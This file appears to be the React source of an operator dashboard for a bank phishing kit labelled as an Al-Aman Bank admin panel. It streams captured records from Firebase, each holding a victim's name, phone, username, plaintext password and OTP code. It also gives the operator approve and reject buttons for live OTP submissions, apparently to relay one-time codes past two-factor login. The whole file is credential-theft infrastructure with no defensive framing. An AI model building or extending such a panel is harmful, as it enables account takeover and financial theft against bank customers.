import { useEffect, useState } from "react";
import { subscribeToOrders, approveOrder, rejectOrder } from "@/lib/firebase";

interface Order {
  id: string;
  fullName?: string;
  phone?: string;
  username?: string;
  password?: string;
  otp?: string;
  step?: string;
  approved?: boolean | null;
  timestamp?: any;
  completedAt?: any;
  updatedAt?: any;
}

const TEAL = "#2ca5e0";
const DARK = "#1c1e22";
const DARK2 = "#232629";
const DARK3 = "#2b2d31";
const BUBBLE = "#212d3b";
const BUBBLE_OUT = "#2b5278";
const GREEN = "#4caf50";

function timeAgo(ts: any): string {
  if (!ts) return "";
  const date = ts.toDate ? ts.toDate() : new Date(ts);
  const diff = Math.floor((Date.now() - date.getTime()) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return date.toLocaleDateString("ar-LY");
}

function getStep(order: Order): { label: string; color: string; icon: string } {
  switch (order.step) {
    case "otp": return { label: "مكتمل", color: GREEN, icon: "✓" };
    case "login": return { label: "تسجيل دخول", color: "#f59e0b", icon: "🔑" };
    case "registered": return { label: "تسجيل", color: TEAL, icon: "📝" };
    default: return { label: "جديد", color: "#94a3b8", icon: "•" };
  }
}

function DataRow({ label, value, icon, secret }: { label: string; value?: string; icon: string; secret?: boolean }) {
  const [show, setShow] = useState(false);
  if (!value) return null;
  return (
    <div style={{ display: "flex", alignItems: "center", gap: 8, padding: "4px 0", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
      <span style={{ fontSize: 14, width: 20, textAlign: "center" }}>{icon}</span>
      <span style={{ fontSize: 11, color: "#94a3b8", width: 70, flexShrink: 0, fontFamily: "'Cairo',sans-serif" }}>{label}</span>
      <span style={{ fontSize: 13, color: "white", flex: 1, fontFamily: secret ? "monospace" : "'Cairo',sans-serif", letterSpacing: secret && !show ? 2 : 0 }}>
        {secret && !show ? "••••••••" : value}
      </span>
      {secret && (
        <button onClick={() => setShow(s => !s)} style={{ background: "none", border: "none", cursor: "pointer", color: "#94a3b8", fontSize: 11, fontFamily: "'Cairo',sans-serif" }}>
          {show ? "إخفاء" : "إظهار"}
        </button>
      )}
    </div>
  );
}

function MessageBubble({ order, index }: { order: Order; index: number }) {
  const step = getStep(order);
  const ts = order.completedAt || order.updatedAt || order.timestamp;
  const [acting, setActing] = useState(false);

  const isAwaitingApproval = order.step === "otp" && order.approved === null;
  const isApproved = order.approved === true;
  const isRejected = order.approved === false;

  const handleApprove = async () => {
    setActing(true);
    await approveOrder(order.id).catch(console.error);
    setActing(false);
  };
  const handleReject = async () => {
    setActing(true);
    await rejectOrder(order.id).catch(console.error);
    setActing(false);
  };

  return (
    <div style={{ display: "flex", gap: 10, padding: "6px 12px", animation: "ab-slide-up 0.3s ease both", animationDelay: `${Math.min(index, 8) * 0.04}s` }}>
      {/* Avatar */}
      <div style={{ width: 38, height: 38, borderRadius: "50%", background: `linear-gradient(135deg, ${BUBBLE_OUT}, ${TEAL})`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16, flexShrink: 0, marginTop: 2, boxShadow: "0 2px 8px rgba(0,0,0,0.4)" }}>
        {order.fullName ? order.fullName.charAt(0) : "?"}
      </div>

      <div style={{ flex: 1, maxWidth: "calc(100% - 48px)" }}>
        {/* Name + time */}
        <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: 4 }}>
          <span style={{ fontSize: 13, fontWeight: 700, color: TEAL, fontFamily: "'Cairo',sans-serif" }}>
            {order.fullName || "مجهول"}
          </span>
          <span style={{ fontSize: 10, color: "#64748b" }}>{timeAgo(ts)}</span>
        </div>

        {/* Bubble */}
        <div style={{ background: BUBBLE, borderRadius: "4px 14px 14px 14px", padding: "10px 14px", boxShadow: "0 1px 4px rgba(0,0,0,0.3)" }}>
          <DataRow label="الاسم" value={order.fullName} icon="👤" />
          <DataRow label="الهاتف" value={order.phone} icon="📱" />
          <DataRow label="المستخدم" value={order.username} icon="🧑" />
          <DataRow label="كلمة المرور" value={order.password} icon="🔑" secret />
          <DataRow label="رمز OTP" value={order.otp} icon="🔐" secret />

          {/* Step badge + ID */}
          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginTop: 8, paddingTop: 8, borderTop: "1px solid rgba(255,255,255,0.06)" }}>
            <span style={{ fontSize: 10, color: "#475569", fontFamily: "monospace" }}>
              #{order.id.slice(-8)}
            </span>
            <div style={{ display: "flex", alignItems: "center", gap: 4, background: `${step.color}20`, border: `1px solid ${step.color}40`, borderRadius: 20, padding: "3px 10px" }}>
              <span style={{ fontSize: 10 }}>{step.icon}</span>
              <span style={{ fontSize: 10, fontWeight: 700, color: step.color, fontFamily: "'Cairo',sans-serif" }}>{step.label}</span>
            </div>
          </div>

          {/* ── Approval section ── only visible for OTP submissions */}
          {order.step === "otp" && (
            <div style={{ marginTop: 10, paddingTop: 10, borderTop: "1px solid rgba(255,255,255,0.06)" }}>
              {isAwaitingApproval && (
                <div style={{ display: "flex", gap: 8 }}>
                  <button
                    disabled={acting}
                    onClick={handleApprove}
                    style={{ flex: 1, padding: "8px 0", borderRadius: 10, border: "none", background: acting ? "#1a3a1a" : "linear-gradient(135deg,#16a34a,#15803d)", color: "white", fontWeight: 800, fontSize: 13, cursor: acting ? "not-allowed" : "pointer", fontFamily: "'Cairo',sans-serif", display: "flex", alignItems: "center", justifyContent: "center", gap: 5, opacity: acting ? 0.6 : 1, transition: "all 0.2s" }}
                  >
                    {acting ? "..." : <><span>✓</span><span>قبول</span></>}
                  </button>
                  <button
                    disabled={acting}
                    onClick={handleReject}
                    style={{ flex: 1, padding: "8px 0", borderRadius: 10, border: "none", background: acting ? "#3a1a1a" : "linear-gradient(135deg,#dc2626,#b91c1c)", color: "white", fontWeight: 800, fontSize: 13, cursor: acting ? "not-allowed" : "pointer", fontFamily: "'Cairo',sans-serif", display: "flex", alignItems: "center", justifyContent: "center", gap: 5, opacity: acting ? 0.6 : 1, transition: "all 0.2s" }}
                  >
                    {acting ? "..." : <><span>✕</span><span>رفض</span></>}
                  </button>
                </div>
              )}
              {isApproved && (
                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, padding: "8px 0", background: "rgba(22,163,74,0.15)", borderRadius: 10, border: "1px solid rgba(22,163,74,0.3)" }}>
                  <span style={{ fontSize: 14 }}>✅</span>
                  <span style={{ color: "#4ade80", fontSize: 12, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>تمت الموافقة</span>
                </div>
              )}
              {isRejected && (
                <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, padding: "8px 0", background: "rgba(220,38,38,0.15)", borderRadius: 10, border: "1px solid rgba(220,38,38,0.3)" }}>
                  <span style={{ fontSize: 14 }}>❌</span>
                  <span style={{ color: "#f87171", fontSize: 12, fontWeight: 700, fontFamily: "'Cairo',sans-serif" }}>تم الرفض</span>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default function AdminPage() {
  const [orders, setOrders] = useState<Order[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<"all" | "otp" | "login" | "registered">("all");

  useEffect(() => {
    const unsub = subscribeToOrders((data) => {
      setOrders(data);
      setLoading(false);
    });
    return () => unsub();
  }, []);

  const filtered = orders.filter(o => {
    if (filter !== "all" && o.step !== filter) return false;
    if (!search) return true;
    const q = search.toLowerCase();
    return (
      o.fullName?.toLowerCase().includes(q) ||
      o.phone?.includes(q) ||
      o.username?.toLowerCase().includes(q) ||
      o.id.includes(q)
    );
  });

  const counts = {
    all: orders.length,
    otp: orders.filter(o => o.step === "otp").length,
    login: orders.filter(o => o.step === "login").length,
    registered: orders.filter(o => o.step === "registered").length,
  };

  return (
    <div style={{ display: "flex", height: "100vh", background: DARK, fontFamily: "'Cairo', sans-serif", maxWidth: 480, margin: "0 auto", flexDirection: "column" }}>

      {/* ── Top bar (Telegram-style) ── */}
      <div style={{ background: DARK2, padding: "12px 16px", display: "flex", alignItems: "center", gap: 12, borderBottom: "1px solid rgba(255,255,255,0.06)", flexShrink: 0 }}>
        <div style={{ width: 42, height: 42, borderRadius: "50%", background: `linear-gradient(135deg, ${TEAL}, #1a8fc2)`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 20, boxShadow: `0 2px 12px ${TEAL}50` }}>
          📊
        </div>
        <div style={{ flex: 1 }}>
          <div style={{ color: "white", fontWeight: 800, fontSize: 15 }}>لوحة البيانات</div>
          <div style={{ color: "#64748b", fontSize: 11 }}>
            {loading ? "جارٍ التحميل..." : `${orders.length} سجل • متصل`}
          </div>
        </div>
        {/* Live indicator */}
        <div style={{ display: "flex", alignItems: "center", gap: 5 }}>
          <div style={{ width: 8, height: 8, borderRadius: "50%", background: GREEN, boxShadow: `0 0 8px ${GREEN}`, animation: "ab-pulse-glow 2s infinite" }} />
          <span style={{ color: "#64748b", fontSize: 11 }}>مباشر</span>
        </div>
      </div>

      {/* ── Stats row ── */}
      <div style={{ display: "flex", background: DARK3, borderBottom: "1px solid rgba(255,255,255,0.05)", flexShrink: 0 }}>
        {[
          { key: "all", label: "الكل", color: "#94a3b8", icon: "📋" },
          { key: "otp", label: "مكتمل", color: GREEN, icon: "✓" },
          { key: "login", label: "دخول", color: "#f59e0b", icon: "🔑" },
          { key: "registered", label: "تسجيل", color: TEAL, icon: "📝" },
        ].map(tab => (
          <button
            key={tab.key}
            onClick={() => setFilter(tab.key as any)}
            style={{
              flex: 1, padding: "10px 4px", background: "none", border: "none", cursor: "pointer",
              borderBottom: filter === tab.key ? `2px solid ${tab.color}` : "2px solid transparent",
              transition: "all 0.2s",
            }}
          >
            <div style={{ fontSize: 14 }}>{tab.icon}</div>
            <div style={{ fontSize: 16, fontWeight: 800, color: filter === tab.key ? tab.color : "#475569" }}>
              {counts[tab.key as keyof typeof counts]}
            </div>
            <div style={{ fontSize: 9, color: filter === tab.key ? tab.color : "#475569", fontFamily: "'Cairo',sans-serif" }}>
              {tab.label}
            </div>
          </button>
        ))}
      </div>

      {/* ── Search bar ── */}
      <div style={{ padding: "8px 12px", background: DARK2, borderBottom: "1px solid rgba(255,255,255,0.05)", flexShrink: 0 }}>
        <div style={{ position: "relative" }}>
          <span style={{ position: "absolute", right: 12, top: "50%", transform: "translateY(-50%)", fontSize: 14 }}>🔍</span>
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="بحث بالاسم أو الهاتف..."
            dir="rtl"
            style={{ width: "100%", padding: "8px 36px 8px 12px", background: DARK3, border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10, color: "white", fontSize: 13, fontFamily: "'Cairo',sans-serif", outline: "none", boxSizing: "border-box" }}
          />
        </div>
      </div>

      {/* ── Messages list ── */}
      <div style={{ flex: 1, overflowY: "auto", padding: "8px 0" }}>
        {loading ? (
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", height: "100%", gap: 12 }}>
            <div style={{ width: 48, height: 48, borderRadius: "50%", border: `3px solid ${TEAL}`, borderTopColor: "transparent", animation: "ab-spin 1s linear infinite" }} />
            <span style={{ color: "#64748b", fontSize: 14 }}>جارٍ تحميل البيانات...</span>
          </div>
        ) : filtered.length === 0 ? (
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", height: "100%", gap: 8 }}>
            <div style={{ fontSize: 48 }}>📭</div>
            <span style={{ color: "#475569", fontSize: 14, fontFamily: "'Cairo',sans-serif" }}>
              {search ? "لا توجد نتائج" : "لا توجد بيانات بعد"}
            </span>
          </div>
        ) : (
          filtered.map((order, i) => (
            <MessageBubble key={order.id} order={order} index={i} />
          ))
        )}
      </div>

      {/* ── Bottom bar ── */}
      <div style={{ background: DARK2, padding: "8px 16px", display: "flex", alignItems: "center", justifyContent: "center", borderTop: "1px solid rgba(255,255,255,0.06)", flexShrink: 0 }}>
        <span style={{ color: "#475569", fontSize: 11 }}>مصرف الأمان • لوحة الإدارة • {new Date().getFullYear()}</span>
      </div>
    </div>
  );
}
